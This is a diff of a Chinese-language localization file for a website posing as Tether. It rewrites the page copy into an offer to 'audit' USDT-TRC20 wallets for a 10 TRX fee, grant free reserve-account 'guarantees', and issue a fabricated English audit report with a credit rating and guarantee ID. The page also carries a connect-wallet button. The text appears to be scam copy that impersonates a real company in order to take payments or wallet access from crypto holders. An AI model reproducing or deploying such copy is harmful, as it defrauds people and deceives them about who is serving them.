@@ -1,11 +1,9 @@
 {
   "greeting": "您好!",
-  "blockOne.title": "Tether 代幣",
-  "blockOne.subtitle.1": "世界上第一個穩定幣",
-  "blockOne.subtitle.2": "Unparalleled Liquidit",
-  "blockOne.subtitle.3": "無與倫比的流動性",
-  "blockOne.subtitle.4": "指數型增長",
-  "blockOne.subtitle.5": "掌控貨幣的未來",
+  "blockOne.title": "Tether 審計與擔保",
+  "blockOne.subtitle.1": "只須支付 10 TRX 就可以替您的 USDT-TRC20 資產進行審查並獲取報告",
+  "blockOne.subtitle.2": "優質用戶可免費使用Tether 提供轉數儲備美金帳戶作為擔保",
+  "blockOne.subtitle.3": "增加您在場外交易OTC的可信度",
   "blockOne.input.emailAddress": "郵箱地址",
   "blockOne.button.connectWallet": "連結錢包",
   "blockTwo.title": "推動貨幣的未來",
@@ -28,5 +26,9 @@
   "blockSix.faq.3.title": "什麼是 Tether 代幣？",
   "blockSix.faq.3.content":"Tether 代幣是一種資產，可以像其他數字貨幣一樣輕鬆地在區塊鏈中移動，但與現實世界的貨幣一對一地掛鉤。<br><br >Tether 代幣被稱為穩定幣，因為它們與法定貨幣掛鉤，因此價格穩定。這為交易者、商家和基金在退出市場頭寸時提供了低波動性解決方案。<br><br>所有 Tether 代幣都是與匹配的法定貨幣（例如，1 美元₮ = 1 美元）以 1 比 1 掛鉤，並 100% 由 Tether 的儲備支持。<br><br>作為一家完全透明的公司，我們發布每日記錄當前總資產和儲備。",
   "blockSix.faq.4.title": "Tether 支持哪些幣種商品？",
-  "blockSix.faq.4.content": "Tether 支持美元 (USD)、歐元、墨西哥比索、離岸人民幣和黃金，分別有以下 Tether 代幣:USD₮、EUR₮、MXN₮、CNH₮和 XAU₮"
+  "blockSix.faq.4.content": "Tether 支持美元 (USD)、歐元、墨西哥比索、離岸人民幣和黃金，分別有以下 Tether 代幣:USD₮、EUR₮、MXN₮、CNH₮和 XAU₮",
+  "report.title": "USDT-TRC20 Account Audit Report",
+  "report.walletAddress": "Tron wallet address TMJfx...",
+  "report.creditRating": "Credit Rating: A",
+  "report.content": "The USDT you hold has been reviewed by Tether, and there is a abnormality after checking the historical transactions. The credit raring is A. Tether can provide a dedicated reserve USD account as a guarantee for free. Your guarantee ID: TEKvt08rk. if you need this service Please contact customer service."
 }
